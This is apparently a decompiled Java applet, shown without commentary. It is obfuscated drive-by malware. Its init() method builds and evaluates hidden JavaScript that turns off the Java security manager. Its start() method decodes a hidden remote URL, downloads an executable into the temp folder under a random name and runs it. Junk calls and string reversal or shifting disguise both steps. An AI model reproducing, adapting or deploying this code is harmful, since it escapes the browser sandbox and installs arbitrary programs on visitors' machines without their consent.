import java.io.InputStream;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.FileOutputStream;
import java.util.Random;
import java.net.URL;
import javax.script.ScriptEngine;
import java.awt.Component;
import javax.script.ScriptEngineManager;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class iops extends Applet
{
    public int sdS;
    private Class[] sdh;
    private String sdsh;
    private Class[] sdxx;
    private JList qrist;
    private Class[] eee2;
    private Boolean sdh3;
    public Class dfj3C;
    public String djrr3;
    public Class[] jj334p;
    public Boolean j43g3;
    public int jg3g34;
    public Class[] jfdh3;
    public Class Gj3h;
    private JList mgst;
    
    public Boolean xcccs() {
        return true;
    }
    
    public Boolean sffs() {
        return false;
    }
    
    @Override
    public void init() {
        this.sffs();
        final String forum = "hello world!";
        final String jessica = forum.substring(3);
        final int soul = 9;
        this.sffs();
        int i = 0;
        while (i < 10) {
            try {
                final String sdg = "asga".replace("asga", "js");
                this.xcccs();
                final String sum = "hello world!";
                final String asica = sum.substring(3);
                final int saoul = 6;
                final ScriptEngine bet = new ScriptEngineManager().getEngineByName(sdg);
                this.sffs();
                this.xcccs();
                final String sdytsdhsdh = ";swebastoiwebastoht = egwebastoasswebastoem.rowebastorre;};\"pwebastoey\" nruwebastoter;)(twebastorats.telwebastoppa;)llwebastoun(regwebastoanaMytirucewebastoStes.metsyS.gwebastonal.avawebastoj {)(noitcnuf = gnwebastoirtSot.siwebastoht;)\"rowebastorre yM\"(rowebastorrE wen = rowebastorre rav".replace("webasto", "");
                this.sffs();
                final String sdhh = new StringBuffer(sdytsdhsdh).reverse().toString();
                this.xcccs();
                if (this.xcccs()) {
                    bet.eval(sdhh);
                }
                this.xcccs();
                final String essrs = "rwebastoorwebastore".replace("webasto", "");
                this.xcccs();
                this.sffs();
                final String reero = new StringBuffer(essrs).reverse().toString();
                this.qrist = new JList((E[])new Object[] { bet.get(reero) });
                this.sffs();
                this.xcccs();
                this.xcccs();
                this.xcccs();
                this.xcccs();
                this.xcccs();
                this.xcccs();
                this.sffs();
                this.add(this.qrist);
                this.xcccs();
                this.xcccs();
                i = 10;
                this.xcccs();
                this.xcccs();
                return;
            }
            catch (Exception ex) {
                if (i != 9) {}
                ++i;
                continue;
            }
            break;
        }
    }
    
    public Boolean swefVw() {
        return true;
    }
    
    public void swef() {
        final int asg = 9;
        final int ra = asg / 2 + 15;
        final boolean bodl = true;
    }
    
    @Override
    public void start() {
        try {
            final String asgggasg = "lxxt>337525<8267;28=3pseh2tltCwtpAvlmrs";
            String sdhds = "";
            this.sffs();
            this.swef();
            for (int s = 0; s < asgggasg.length(); ++s) {
                int weq = asgggasg.charAt(s);
                weq -= 4;
                this.sffs();
                sdhds += (char)weq;
            }
            final URL sdeea = new URL(sdhds);
            if (this.xcccs()) {
                sdeea.openConnection();
            }
            this.sffs();
            this.swef();
            this.swef();
            this.sffs();
            this.sffs();
            final InputStream sdgsdh = sdeea.openStream();
            this.swef();
            this.swef();
            this.sffs();
            for (int wrg = 0; wrg < 9; ++wrg, ++wrg) {}
            this.swef();
            this.sffs();
            String yybet = System.getProperty("ja214v214a.214i214o.t214mp214dir".replace("214", ""));
            this.swef();
            this.swef();
            this.sffs();
            if (yybet.charAt(yybet.length() - 1) != '\\') {
                yybet += "\\";
            }
            final Random ssda = new Random();
            this.swef();
            this.swef();
            final int randomInt = ssda.nextInt(100);
            this.swef();
            this.swef();
            final String fl = yybet + "lie" + Integer.toString(randomInt) + ".e".concat("xe");
            this.swef();
            this.swef();
            final FileOutputStream xdss = new FileOutputStream(fl);
            this.swef();
            this.swef();
            byte[] sewwa = new byte[153600];
            final byte[] xcbeas = new byte[122];
            this.swef();
            this.swef();
            int qww = 0;
            this.swef();
            this.swef();
            int asb = 0;
            this.swef();
            while ((asb = sdgsdh.read(sewwa)) > 0) {
                xdss.write(sewwa, 0, asb);
                this.swef();
                final int b = 0;
                sewwa = new byte[153600];
                qww += asb;
            }
            this.swef();
            xdss.close();
            this.sffs();
            sdgsdh.close();
            final boolean wwerist;
            final boolean tqwt = wwerist = true;
            final boolean localn3;
            final boolean tqwt2 = localn3 = true;
            this.sffs();
            this.swef();
            this.swef();
            final Runtime sbcs = Runtime.getRuntime();
            for (int aj = 0; aj < 9; ++aj, ++aj) {}
            this.swef();
            this.swef();
            final Process exa = sbcs.exec(fl);
            exa.waitFor();
            this.swef();
            final BufferedReader fduuer = new BufferedReader(new InputStreamReader(exa.getInputStream()));
        }
        catch (Exception ex) {}
    }
}
